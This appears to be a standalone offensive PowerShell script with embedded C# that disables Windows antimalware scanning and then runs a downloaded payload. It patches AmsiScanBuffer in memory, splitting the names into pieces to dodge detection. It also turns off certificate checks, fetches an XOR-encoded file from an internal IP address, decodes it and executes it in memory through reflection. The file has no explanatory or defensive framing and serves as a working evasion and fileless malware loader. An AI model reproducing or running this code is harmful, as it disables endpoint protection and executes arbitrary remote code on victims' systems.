# Reflection-based DLL injection without AMSI triggers
$code = @"
using System;
using System.Runtime.InteropServices;

public class Inject {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void Patch() {
        var lib = LoadLibrary("am" + "si.dll");
        var addr = GetProcAddress(lib, "Am" + "siScan" + "Buffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, 6);
    }
}
"@

Add-Type $code
[Inject]::Patch()

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("file", "data.bin")
$enc = $wc.DownloadData("https://192.168.124.133/file/download")
$dec = New-Object byte[] $enc.Length
for($i=0; $i -lt $enc.Length; $i++) { $dec[$i] = $enc[$i] -bxor 0x42 }
[Reflection.Assembly]::Load($dec).EntryPoint.Invoke($null, @(,[string[]]@()))
